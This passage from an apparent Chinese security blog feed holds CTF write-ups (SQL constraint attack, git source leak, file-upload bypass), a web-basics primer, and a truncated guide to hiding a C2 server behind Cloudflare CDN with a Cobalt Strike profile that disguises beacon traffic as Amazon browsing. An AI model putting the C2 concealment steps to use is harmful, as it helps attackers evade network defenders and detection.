<p><img src="/2022/11/02/PwnLab/image-20221102182436154.png" alt="image-20221102182436154"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最后那个;绕过的提权确实没想到，只能说是情理之中意料之外的吧，要是没有攻略，我可能还是打不到最后一步。还有就是，要善于总结信息，很多漏洞就是从各种信息中分析出来的。最后要是是那种受限的shell，记得弄一个tty。</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>WEB入门</title>
    <url>/2022/02/10/WEB%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h1><p>最近感觉基础薄弱，遂重新温习一下各类基础</p>
<h1 id="1-WEB技术架构"><a href="#1-WEB技术架构" class="headerlink" title="1. WEB技术架构"></a>1. WEB技术架构</h1><p><img src="/2022/02/10/WEB%E5%85%A5%E9%97%A8/image-20220210105848463.png" alt="image-20220210105848463"></p>
<h2 id="1-1-协议"><a href="#1-1-协议" class="headerlink" title="1.1 协议"></a>1.1 协议</h2><h3 id="1-1-1-http协议"><a href="#1-1-1-http协议" class="headerlink" title="1.1.1 http协议"></a>1.1.1 http协议</h3><h4 id="1-1-1-1-http简介"><a href="#1-1-1-1-http简介" class="headerlink" title="1.1.1.1 http简介"></a>1.1.1.1 http简介</h4><p>超文本传输协议（英文：<strong>H</strong>yper<strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol，缩写：HTTP）是一种用于分布式、协作式和超媒体信息系统的应用层协议。HTTP是万维网的数据通信的基础。</p>
<h4 id="1-1-1-2-http概述"><a href="#1-1-1-2-http概述" class="headerlink" title="1.1.1.2 http概述"></a>1.1.1.2 http概述</h4><p>HTTP是一个客户端终端（用户）和服务器端（网站）请求和应答的标准（TCP）。通过使用网页浏览器、网络爬虫或者其它的工具，客户端发起一个HTTP请求到服务器上指定端口（默认端口为80）。我们称这个客户端为用户代理程序（user agent）。应答的服务器上存储着一些资源，比如HTML文件和图像。我们称这个应答服务器为源服务器（origin server）。在用户代理和源服务器中间可能存在多个“中间层”，比如代理服务器、网关或者隧道（tunnel）。</p>
<p>尽管TCP/IP协议是互联网上最流行的应用，HTTP协议中，并没有规定必须使用它或它支持的层。事实上，HTTP可以在任何互联网协议上，或其他网络上实现。HTTP假定其下层协议提供可靠的传输。因此，任何能够提供这种保证的协议都可以被其使用。因此也就是其在TCP/IP协议族使用TCP作为其传输层。</p>
<p>通常，由HTTP客户端发起一个请求，创建一个到服务器指定端口（默认是80端口）的TCP连接。HTTP服务器则在那个端口监听客户端的请求。一旦收到请求，服务器会向客户端返回一个状态，比如”HTTP/1.1 200 OK”，以及返回的内容，如请求的文件、错误消息、或者其它信息。</p>
<h4 id="1-1-1-3-http工作原理"><a href="#1-1-1-3-http工作原理" class="headerlink" title="1.1.1.3 http工作原理"></a>1.1.1.3 http工作原理</h4><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
<p>以下是 HTTP 请求/响应的步骤：</p>
<p>\1. 客户端连接到Web服务器<br>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.baidu.com/">http://www.baidu.com</a>。</p>
<p>\2. 发送HTTP请求<br>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p>
<p>\3. 服务器接受请求并返回HTTP响应<br>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p>
<p>\4. 释放连接TCP连接<br>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
<p>\5. 客户端浏览器解析HTML内容<br>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p>
<h4 id="1-1-1-4-HTTP状态码"><a href="#1-1-1-4-HTTP状态码" class="headerlink" title="1.1.1.4 HTTP状态码"></a>1.1.1.4 HTTP状态码</h4><p><img src="/2022/02/10/WEB%E5%85%A5%E9%97%A8/877318-20180418161321986-304902913.png" alt="img"></p>
<h4 id="1-1-1-5-url"><a href="#1-1-1-5-url" class="headerlink" title="1.1.1.5 url"></a>1.1.1.5 url</h4><p>超文本传输协议（HTTP）的统一资源定位符将从因特网获取信息的五个基本元素包括在一个简单的地址中：</p>
<ul>
<li>传送协议。</li>
<li>层级URL标记符号(为[//],固定不变)</li>
<li>访问资源需要的凭证信息（可省略）</li>
<li>服务器。（通常为域名，有时为IP地址）</li>
<li>端口号。（以数字方式表示，若为HTTP的默认值“:80”可省略）</li>
<li>路径。（以“/”字符区别路径中的每一个目录名称）</li>
<li>查询。（GET模式的窗体参数，以“?”字符为起点，每个参数以“&amp;”隔开，再以“=”分开参数名称与数据，通常以UTF8的URL编码，避开字符冲突的问题）</li>
<li>片段。以“#”字符为起点</li>
</ul>
<p>以<a href="http://www.luffycity.com/news/index.html?id=250&amp;page=1">http://www.luffycity.com:80/news/index.html?id=250&amp;page=1</a> 为例</p>
<h4 id="1-1-1-6-http响应格式"><a href="#1-1-1-6-http响应格式" class="headerlink" title="1.1.1.6 http响应格式"></a>1.1.1.6 http响应格式</h4><p><img src="/2022/02/10/WEB%E5%85%A5%E9%97%A8/867021-20180322001744323-654009411.jpg" alt="img"></p>
<p><a href="https://www.cnblogs.com/an-wen/p/11180076.html">HTTP协议超级详解 - 爱文飞翔 - 博客园 (cnblogs.com)</a></p>
<h3 id="1-1-2-https协议"><a href="#1-1-2-https协议" class="headerlink" title="1.1.2 https协议"></a>1.1.2 https协议</h3><p>基于HTTP协议，通过SSL或TLS提供加密处理数据、验证对方身份以及数据完整性保护</p>
<p>通过抓包可以看到数据不是明文传输，而且HTTPS有如下特点：</p>
<ol>
<li>内容加密：采用混合加密技术，中间者无法直接查看明文内容</li>
<li>验证身份：通过证书认证客户端访问的是自己的服务器</li>
<li>保护数据完整性：防止传输的内容被中间人冒充或者篡改</li>
</ol>
<h4 id="1-1-2-1-ssl建立连接过程"><a href="#1-1-2-1-ssl建立连接过程" class="headerlink" title="1.1.2.1 ssl建立连接过程"></a>1.1.2.1 ssl建立连接过程</h4><p><img src="/2022/02/10/WEB%E5%85%A5%E9%97%A8/1.png" alt="在这里插入图片描述"></p>
<p>client向server发送请求<a href="https://baidu.com,然后连接到server的443端口,发送的信息主要是随机值1和客户端支持的加密算法./">https://baidu.com，然后连接到server的443端口，发送的信息主要是随机值1和客户端支持的加密算法。</a><br>server接收到信息之后给予client响应握手信息，包括随机值2和匹配好的协商加密算法，这个加密算法一定是client发送给server加密算法的子集。<br>随即server给client发送第二个响应报文是数字证书。服务端必须要有一套数字证书，可以自己制作，也可以向组织申请。区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面，这套证书其实就是一对公钥和私钥。传送证书，这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间、服务端的公钥，第三方证书认证机构(CA)的签名，服务端的域名信息等内容。<br>客户端解析证书，这部分工作是由客户端的TLS来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。如果证书没有问题，那么就生成一个随即值（预主秘钥）。<br>客户端认证证书通过之后，接下来是通过随机值1、随机值2和预主秘钥组装会话秘钥。然后通过证书的公钥加密会话秘钥。<br>传送加密信息，这部分传送的是用证书加密后的会话秘钥，目的就是让服务端使用秘钥解密得到随机值1、随机值2和预主秘钥。<br>服务端解密得到随机值1、随机值2和预主秘钥，然后组装会话秘钥，跟客户端会话秘钥相同。<br>客户端通过会话秘钥加密一条消息发送给服务端，主要验证服务端是否正常接受客户端加密的消息。<br>同样服务端也会通过会话秘钥加密一条消息回传给客户端，如果客户端能够正常接受的话表明SSL层连接建立完成了。</p>
<p><a href="https://blog.csdn.net/xiaoming100001/article/details/81109617">(39条消息) HTTP和HTTPS协议，看一篇就够了_不一样的博客-CSDN博客_https</a></p>
<h2 id="1-2-系统"><a href="#1-2-系统" class="headerlink" title="1.2 系统"></a>1.2 系统</h2><p>在这只是先了解基础，后面会继续深入学习操作系统方面的东西</p>
<h3 id="1-2-1-Linux系统"><a href="#1-2-1-Linux系统" class="headerlink" title="1.2.1 Linux系统"></a>1.2.1 Linux系统</h3><p>Linux，全称GNU/Linux，是一种免费使用和自由传播的<a href="https://baike.baidu.com/item/%E7%B1%BBUNIX/9032872">类UNIX</a>操作系统，其内核由<a href="https://baike.baidu.com/item/%E6%9E%97%E7%BA%B3%E6%96%AF%C2%B7%E6%9C%AC%E7%BA%B3%E7%AC%AC%E5%85%8B%E7%89%B9%C2%B7%E6%89%98%E7%93%A6%E5%85%B9/1034429">林纳斯·本纳第克特·托瓦兹</a>于1991年10月5日首次发布，它主要受到<a href="https://baike.baidu.com/item/Minix/7106045">Minix</a>和Unix思想的启发，是一个基于<a href="https://baike.baidu.com/item/POSIX">POSIX</a>的多用户、<a href="https://baike.baidu.com/item/%E5%A4%9A%E4%BB%BB%E5%8A%A1/1011764">多任务</a>、支持<a href="https://baike.baidu.com/item/%E5%A4%9A%E7%BA%BF%E7%A8%8B/1190404">多线程</a>和多<a href="https://baike.baidu.com/item/CPU">CPU</a>的操作系统。它能运行主要的<a href="https://baike.baidu.com/item/Unix/219943">Unix</a>工具软件、应用程序和网络协议。它支持<a href="https://baike.baidu.com/item/32%E4%BD%8D/5812218">32位</a>和<a href="https://baike.baidu.com/item/64%E4%BD%8D">64位</a>硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux有上百种不同的发行版，如基于社区开发的<a href="https://baike.baidu.com/item/debian/748667">debian</a>、<a href="https://baike.baidu.com/item/archlinux/10857530">archlinux</a>，和基于商业开发的[Red Hat Enterprise Linux](<a href="https://baike.baidu.com/item/Red">https://baike.baidu.com/item/Red</a> Hat Enterprise Linux/10770503)、<a href="https://baike.baidu.com/item/SUSE/60409">SUSE</a>、[Oracle Linux](<a href="https://baike.baidu.com/item/Oracle">https://baike.baidu.com/item/Oracle</a> Linux/6876458)等。</p>
<h3 id="1-2-2-Unix系统"><a href="#1-2-2-Unix系统" class="headerlink" title="1.2.2 Unix系统"></a>1.2.2 Unix系统</h3><p>Unix是20世纪70年代初出现的一个操作系统，除了作为网络操作系统之外，还可以作为单机操作系统使用。Unix作为一种开发平台和台式操作系统获得了广泛使用，主要用于工程应用和科学计算等领域。</p>
<h2 id="1-3-前端"><a href="#1-3-前端" class="headerlink" title="1.3 前端"></a>1.3 前端</h2><p><img src="/2022/02/10/WEB%E5%85%A5%E9%97%A8/v2-bd43cb8bd3dc72bb0df8de108d4de2e0_r.jpg" alt="preview"></p>
<p>了解 web的大概框架，具体某个地方的东西会更深入的学习。</p>
<h2 id="1-4-后端"><a href="#1-4-后端" class="headerlink" title="1.4 后端"></a>1.4 后端</h2><h2 id="1-5-中间件"><a href="#1-5-中间件" class="headerlink" title="1.5 中间件"></a>1.5 中间件</h2><h2 id="1-6-数据库"><a href="#1-6-数据库" class="headerlink" title="1.6 数据库"></a>1.6 数据库</h2><h1 id="2-web网站平台"><a href="#2-web网站平台" class="headerlink" title="2. web网站平台"></a>2. web网站平台</h1><p>内容管理系统（content management system，CMS），是一种位于WEB前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、Intranet以及Extranet网站的信息。<br>内容管理还可选地提供内容抓取工具，将第三方信息来源，比如将文本文件、HTML网页、Web服务、关系数据库等的内容自动抓取，并经分析处理后放到自身的内容库中。<br>随着个性化的发展，内容管理还辅助WEB前端将内容以个性化的方式提供给内容使用者，即提供个性化的门户框架，以基于WEB技术将内容更好地推送到用户的浏览器端.<br>内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场。对于内容管理，业界还没有一个统一的定义，不同的机构有不同的理解。</p>
<h2 id="2-1-wordpress"><a href="#2-1-wordpress" class="headerlink" title="2.1 wordpress"></a>2.1 wordpress</h2><p><strong>WordPress是使用PHP语言开发的<a href="https://www.zhihu.com/search?q=%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1793643716%7D">内容管理系统</a>：</strong></p>
<ul>
<li>内容管理系统，英文叫做 Content Management System（CMS）。</li>
<li>WordPress是全球最多人使用的，免费开源的<a href="https://www.zhihu.com/search?q=%E5%BB%BA%E7%AB%99%E7%A8%8B%E5%BA%8F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1793643716%7D">建站程序</a>。</li>
</ul>
<h2 id="2-2-joomla"><a href="#2-2-joomla" class="headerlink" title="2.2 joomla"></a>2.2 joomla</h2><p>Joomla!是一套全球知名的内容管理系统。Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，最新版本是3.9.27 。可以在Linux、 Windows、MacOSX等各种不同的平台上执行。</p>
<h2 id="2-3-discuz"><a href="#2-3-discuz" class="headerlink" title="2.3 discuz!"></a>2.3 discuz!</h2><p>Crossday Discuz! Board（简称 Discuz!）是北京康盛新创科技有限责任公司推出的一套通用的社区论坛软件系统。自2001年6月面世以来，Discuz!已拥有15年以上的应用历史和200多万网站用户案例，是全球成熟度最高、覆盖率最大的论坛软件系统之一。</p>
<h2 id="2-4-dedecms（织梦）"><a href="#2-4-dedecms（织梦）" class="headerlink" title="2.4 dedecms（织梦）"></a>2.4 dedecms（织梦）</h2><p>织梦内容管理系统(DedeCms) 以简单、实用、开源而闻名，是国内最知名的PHP开源网站管理系统，也是使用用户最多的PHP类CMS系统，在经历多年的发展，版本无论在功能，还是在易用性方面，都有了长足的发展和进步，DedeCms免费版的主要目标用户锁定在个人站长，功能更专注于个人网站或中小型门户的构建，当然也不乏有企业用户和学校等在使用该系统。</p>
<h2 id="2-5-wamp"><a href="#2-5-wamp" class="headerlink" title="2.5 wamp"></a>2.5 wamp</h2><p>Windows下的Apache+Mysql/MariaDB+Perl/PHP/Python，一组常用来搭建动态网站或者服务器的开源软件，本身都是各自独立的程序，但是因为常被放在一起使用，拥有了越来越高的兼容度，共同组成了一个强大的Web应用程序平台。随着开源潮流的蓬勃发展，开放源代码的LAMP已经与J2EE和.Net商业软件形成三足鼎立之势，并且该软件开发的项目在软件方面的投资成本较低，因此受到整个IT界的关注。LAMP是基于Linux，Apache，MySQL/MariaDB和PHP的开放资源网络开发平台，PHP是一种有时候用Perl或Python可代替的编程语言。这个术语来自欧洲，在那里这些程序常用来作为一种标准开发环境。名字来源于每个程序的第一个字母。每个程序在所有权里都符合开放源代码标准：Linux是开放系统；Apache是最通用的网络服务器；mySQL是带有基于网络管理附加工具的关系数据库；PHP是流行的对象脚本语言，它包含了多数其它语言的优秀特征来使得它的网络开发更加有效。开发者在Windows操作系统下使用这些Linux环境里的工具称为使用WAMP。</p>
<p>s</p>
]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>bugku login1解题心得（sql约束攻击）</title>
    <url>/2021/12/27/bugku-login1%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97%EF%BC%88sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB%EF%BC%89/</url>
    <content><![CDATA[<p>bugku login1解题心得（sql约束攻击）</p>
<p><a href="https://blog.csdn.net/weixin_39194641/article/details/90448694">(14条消息) SQL约束攻击_壊壊的诱惑你的博客-CSDN博客_sql约束攻击</a></p>
<p>主要原理是在注册账号时会对用户名进行select查询来看是否有重名，在selct查询的时候会在较短的字符串后面加上“ ”以此来使所有的长度一样。</p>
<p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。这是因为，<strong>SQL会在内部使用空格来填充字符串</strong>，<strong>以便在比较之前使其它们的长度保持一致</strong>。</p>
<p>但是在insert查询的时候由于varchar(n)的限制，所以只截取前面n位数进行插入。</p>
<p>由此可以注册一个“admin                                                                        1”的账户来达到约束攻击。</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>bugku   never_give_up解题心得</title>
    <url>/2021/12/27/bugku-never-give-up%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<p>bugku   never_give_up解题心得</p>
<p>首先看源码看到备注。</p>
<p>根据备注访问了文件，但是直接跳转到首页，这时可以考虑使用bp抓包查看返回数据包。</p>
<p>在返回数据包中发现了加密数据，是url base64 url加密。</p>
<p>然后得到部分关键php代码</p>
<p><img src="https://img-blog.csdnimg.cn/2019061800582911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzMzNTc4,size_16,color_FFFFFF,t_70" alt="img">接下来就是代码审计，下面补充一些代码函数的拓展。</p>
<p>eregi()函数</p>
<p>也可以使用？通配符</p>
<p><img src="/2021/12/27/bugku-never-give-up%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97/image-20211108150506907.png" alt="image-20211108150506907"></p>
<p><img src="/2021/12/27/bugku-never-give-up%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97/image-20211108152538728.png" alt="image-20211108152538728"></p>
<p>substr函数</p>
<p><img src="/2021/12/27/bugku-never-give-up%E8%A7%A3%E9%A2%98%E5%BF%83%E5%BE%97/image-20211108150626916.png" alt="image-20211108150626916"></p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>bugku—source  用 kali Linux 里面的工具下载git源码</title>
    <url>/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<h1 id="bugku—source-用-kali-Linux-里面的工具下载git源码"><a href="#bugku—source-用-kali-Linux-里面的工具下载git源码" class="headerlink" title="bugku—source  用 kali Linux 里面的工具下载git源码"></a>bugku—source  用 kali Linux 里面的工具下载git源码</h1><p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104190602170.png" alt="image-20220104190602170"></p>
<p>打开题目后发现git泄露</p>
<p>用githack下载下来之后</p>
<p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104190631477.png" alt="image-20220104190631477"></p>
<p>根据题目的用linux环境，在Linux中去下载源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -r url</span><br></pre></td></tr></table></figure>

<p>-r表示递归的意思，就是把这个目录所有的文件下载下来</p>
<p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104191045364.png" alt="image-20220104191045364"></p>
<p>下载下来发现文件依然没有，用ls -a发现文件被隐藏了</p>
<p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104191119817.png" alt="image-20220104191119817"></p>
<p>访问.git/logs查看日志文件</p>
<p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104191218579.png" alt="image-20220104191218579"></p>
<p>然后git reflog</p>
<p>查看文件的更新日志</p>
<p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104191314799.png" alt="image-20220104191314799"></p>
<p>然后用git show （加开头黄色那坨字符串）去一个一个查看</p>
<p><img src="/2022/01/04/bugku%E2%80%94source-%E7%94%A8-kali-Linux-%E9%87%8C%E9%9D%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BDgit%E6%BA%90%E7%A0%81/image-20220104191454285.png" alt="image-20220104191454285"></p>
<p>发现flag</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>bugku做题心得 备份是个好习惯</title>
    <url>/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/</url>
    <content><![CDATA[<h4 id="bugku做题心得-备份是个好习惯"><a href="#bugku做题心得-备份是个好习惯" class="headerlink" title="bugku做题心得 备份是个好习惯"></a>bugku做题心得 备份是个好习惯</h4><p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160122664.png" alt="image-20211108160122664"></p>
<p>函数拓展</p>
<p>PHP ini_set用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。 </p>
<p>函数格式：string ini_set(string $varname, string $newvalue) </p>
<p>strstr函数</p>
<p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160329851.png" alt="image-20211108160329851"></p>
<p>关于函数str_replace的绕过</p>
<p><img src="/2021/12/27/bugku%E5%81%9A%E9%A2%98%E5%BF%83%E5%BE%97-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF/image-20211108160933783.png" alt="image-20211108160933783"></p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>bugku遇到的题目心得  xxx二手交易市场   文件上传漏洞</title>
    <url>/2021/12/27/bugku%E9%81%87%E5%88%B0%E7%9A%84%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>bugku遇到的题目心得  xxx二手交易市场   文件上传漏洞</p>
<p>首先上传文件用bp抓包</p>
<p><img src="/2021/12/27/bugku%E9%81%87%E5%88%B0%E7%9A%84%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20211108164017569.png" alt="image-20211108164017569"></p>
<p>发现文件上传的时候是被转化成base64形式的</p>
<p><img src="/2021/12/27/bugku%E9%81%87%E5%88%B0%E7%9A%84%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20211108164107189.png" alt="image-20211108164107189"></p>
<p><img src="/2021/12/27/bugku%E9%81%87%E5%88%B0%E7%9A%84%E9%A2%98%E7%9B%AE%E5%BF%83%E5%BE%97-xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20211108164633630.png" alt="image-20211108164633630"></p>
<p>没想到的点，直接修改图片数据。</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>c2服务器CDN隐藏</title>
    <url>/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/</url>
    <content><![CDATA[<h1 id="c2服务器CDN隐藏"><a href="#c2服务器CDN隐藏" class="headerlink" title="c2服务器CDN隐藏"></a>c2服务器CDN隐藏</h1><h1 id="配置CDN"><a href="#配置CDN" class="headerlink" title="配置CDN"></a>配置CDN</h1><p>域名注册：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">随便找一个可以注册域名的地方，我用的是阿里云。</span><br></pre></td></tr></table></figure>

<p>cloudflare 免费CDN：</p>
<p><a href="https://www.cloudflare.com/zh-cn/">https://www.cloudflare.com/zh-cn/</a></p>
<p>在GoDaddy购买一个域名后，在Cloudflare处添加站点，将域名填写进去</p>
<p>随后添加一个dns记录</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230302110410218.png" alt="image-20230302110410218"></p>
<p>然后需要把域名的dns改成cloudfare提供的dns服务器</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230302110544262.png" alt="image-20230302110544262"></p>
<p>修改好域名的dns服务器之后，需要在cdn上面的缓存设置上修改这两个配置，把他们全部打开。</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230302111615452.png" alt="image-20230302111615452"></p>
<p>把这个设置成灵活</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230302111646403.png" alt="image-20230302111646403"></p>
<p>尝试多地ping</p>
<p><img src="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/image-20230302112024958.png" alt="image-20230302112024958"></p>
<p>不戳</p>
<h1 id="配置cs-profile文件"><a href="#配置cs-profile文件" class="headerlink" title="配置cs profile文件"></a>配置cs profile文件</h1><p>profile文件的模板,需要把3处的host头修改为我们的域名，然后保存为porfile文件，上传到cs目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## Amazon browsing traffic profile# # Author: @harmj0y#set sleeptime &quot;5000&quot;;set jitter    &quot;0&quot;;set maxdns    &quot;255&quot;;set useragent &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;    set uri &quot;/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;session-token=&quot;;</span><br><span class="line">            prepend &quot;skin=noskin;&quot;;</span><br><span class="line">            append &quot;csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;Content-Encoding&quot; &quot;gzip&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;    </span><br><span class="line">    set uri &quot;/N4215/adj/amzn.us.sr.aps&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text/xml&quot;;</span><br><span class="line">        header &quot;X-Requested-With&quot; 